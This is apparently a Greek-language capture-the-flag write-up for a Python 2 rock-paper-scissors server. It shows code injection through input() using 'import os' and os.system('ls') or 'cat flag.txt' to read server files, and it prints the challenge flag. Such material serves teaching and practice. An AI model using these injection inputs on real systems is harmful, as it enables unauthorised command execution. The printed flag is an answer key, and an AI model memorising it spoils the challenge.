# Πέτρα Ψαλίδι Χαρτί

| Δοκιμασία | Πέτρα Ψαλίδι Χαρτί |
| :------- | :----- |
| Δυσκολία | Μέτρια |
| Κατηγορία | Pwn |
| Λύσεις | 10 |
| Πόντοι | 499 |

## Επισκόπηση Δοκιμασίας

Μας δίνεται ένας διακομιστής στο οποίο μπορούμε να συνδεθούμε με την χρήση ενός προγράμματος για TCP sockets σαν το netcat (π.χ. `nc <ip> <port>`).

Παράλληλα, μας δίνεται και ο κώδικας Python του παιχνιδιού που τρέχει στον διακομιστή.

Αν συνδεθούμε στον διακομιστή, ξεκινάει ένα παιχνίδι Πέτρα-Ψαλίδι-Χαρτί το οποίο μπορούμε να παίξουμε εναντίον του υπολογιστή.
```
WELCOME TO ROCK-PAPER-SCISSORS GAME
RUNNING ON PYTHON 2.7.18!
THE FIRST ONE TO WIN 3 ROUND WINS!

-= Round 1 =-
Choose:
1. Rock
2. Paper
3. Scissors
> 1
You chose: Rock
Bot chose: Paper
You lost the round!
Score: Bot 1 - 0 You

-= Round 2 =-
Choose:
1. Rock
2. Paper
3. Scissors
> 3
You chose: Scissors
Bot chose: Paper
You won the round!
Score: Bot 1 - 1 You

-= Round 3 =-
Choose:
1. Rock
2. Paper
3. Scissors
> 1
You chose: Rock
Bot chose: Scissors
You won the round!
Score: Bot 1 - 2 You

-= Round 4 =-
Choose:
1. Rock
2. Paper
3. Scissors
> 2
You chose: Paper
Bot chose: Paper
It's a tie!
Score: Bot 1 - 2 You

-= Round 5 =-
Choose:
1. Rock
2. Paper
3. Scissors
> 2
You chose: Paper
Bot chose: Rock
You won the round!
Score: Bot 1 - 3 You

YOU WON 3 ROUNDS!
YOU WON THE GAME!
BYE!
```

## Επίλυση

Παρατηρούμε πως μόλις συνδεθούμε στον διακομιστή εκτυπώνετε το μήνυμα `RUNNING ON PYTHON 2.7.18!` το οποίο μας ενημερώνει πως ο κώδικας τρέχει σε Python 2.7, και όχι στην καινούρια Python 3.x.

Διαβάζοντας τον κώδικα που τρέχει στον διακομιστή και δίνοντας ιδιαίτερη προσοχή στα κομμάτια του κώδικα που μπορούμε να επηρεάσουμε (π.χ. όταν μας ζητείτε να δώσουμε κάποια είσοδο στο πρόγραμμα), παρατηρούμε πως ο κώδικας κάνει χρήση της Python συνάρτησης `input` για να πάρει την είσοδο του χρήστη από την κονσόλα. Η χρήση αυτής της συνάρτησης όμως σε Python 2.x δημιουργεί προβλήματα ασφαλείας αφού δίνει την δυνατότητα στον χρήστη να εκτελέσει μη έμπιστο κώδικα Python.

Για να δείξουμε ένα παράδειγμα του προβλήματος, μπορούμε όταν μας ζητηθεί η επιλογή μας να δώσουμε σαν είσοδο μια πράξη όπως `1+1` και θα δούμε πως το παιχνίδι νομίζει πως επιλέξαμε Χαρτί (2. Paper) αφού πρώτα εκτέλεσε την πράξη μας και πήρε σαν αποτέλεσμα `2`:

```
WELCOME TO ROCK-PAPER-SCISSORS GAME
RUNNING ON PYTHON 2.7.18!
THE FIRST ONE TO WIN 3 ROUND WINS!

-= Round 1 =-
Choose:
1. Rock
2. Paper
3. Scissors
> 1+1
You chose: Paper
Bot chose: Paper
It's a tie!
Score: Bot 0 - 0 You
```

Μπορούμε λοιπόν να δοκιμάσουμε να τελέσουμε κώδικα Python και να πάρουμε πρόσβαση στον server. Αρχικά μπορούμε να φορτώσουμε βιβλιοθήκες που χρειαζόμαστε και στην συνέχεια να καλέσουμε συναρτήσεις. Έτσι, εκτελούμε με την σειρά, πρώτα `import os` για να φορτώσουμε την βιβλιοθήκη `os` και στην συνέχεια εκτελούμε `os.system('ls')` (ή `os.system('dir')` αν ο διακομιστής τρέχει Windows αντί για Linux) με σκοπό να δούμε τα αρχεία του διακομιστή:

```
WELCOME TO ROCK-PAPER-SCISSORS GAME
RUNNING ON PYTHON 2.7.18!
THE FIRST ONE TO WIN 3 ROUND WINS!

-= Round 1 =-
Choose:
1. Rock
2. Paper
3. Scissors
> import os
Invalid input! Try again.
Choose:
1. Rock
2. Paper
3. Scissors
> os.system('ls')
flag.txt  service.py
Choose:
1. Rock
2. Paper
3. Scissors
>
```

Βλέπουμε πως στην οθόνη εκτυπώθηκε `flag.txt  service.py`, και αντιλαμβανόμαστε πως ο διακομιστής περιέχει ένα αρχείο με όνομα `flag.txt` το οποίο μπορούμε να προσπαθήσουμε να διαβάσουμε (με την χρήση της εντολής `cat flag.txt` για διακομιστές που τρέχουν Linux ή την εντολή `type flag.txt` για διακομιστές που τρέχουν Windows):

```
Choose:
1. Rock
2. Paper
3. Scissors
> os.system('cat flag.txt')
FLAG{I-n3eD-t0-upD4tE-mY-Sy5teM-r1ghT-nOw}
```

## Σημαία

```
FLAG{I-n3eD-t0-upD4tE-mY-Sy5teM-r1ghT-nOw}
```
